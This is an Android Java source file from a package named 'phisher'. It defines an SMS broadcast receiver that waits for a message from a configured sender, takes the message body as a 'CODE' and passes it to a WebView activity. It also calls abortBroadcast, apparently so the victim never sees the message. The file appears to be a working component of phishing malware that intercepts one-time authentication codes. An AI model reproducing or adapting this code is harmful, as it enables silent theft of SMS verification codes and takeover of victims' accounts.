package pl.jasiun.phisher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	
	private Context context;
	
	static private boolean on;
	static private String sender;
	static private String pattern;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		this.context = context;
		
		String action = intent.getAction();
		Bundle bundle = intent.getExtras();
		
		if (action.equals("pl.jasiun.SMS_RECEIVER_SETTINGS_APPEARED")) {
			prepareForReciving(bundle);
		} else if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
			filterSms(bundle);
		}
	}
	
	private void prepareForReciving(Bundle bundle) {
		on = true;
		sender = bundle.getString("SENDER");
		pattern = bundle.getString("PATTERN");
	}

	private void filterSms(Bundle bundle) {
		if(on == false)
			return;
		
		Object messages[] = (Object[]) bundle.get("pdus");
		for (int n = 0; n < messages.length; n++) {
			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) messages[n]);
			
			if (smsMessage.getOriginatingAddress().contains(sender)) {
								
				on = false;
				sendCode(smsMessage.getMessageBody());				
				abortBroadcast();
				return;
			}
		}
	}

	private void sendCode(String code) {
		Intent intent = new Intent(context, WebViewActivity.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
		intent.putExtra("CODE", code);
		context.startActivity(intent);
	}
}
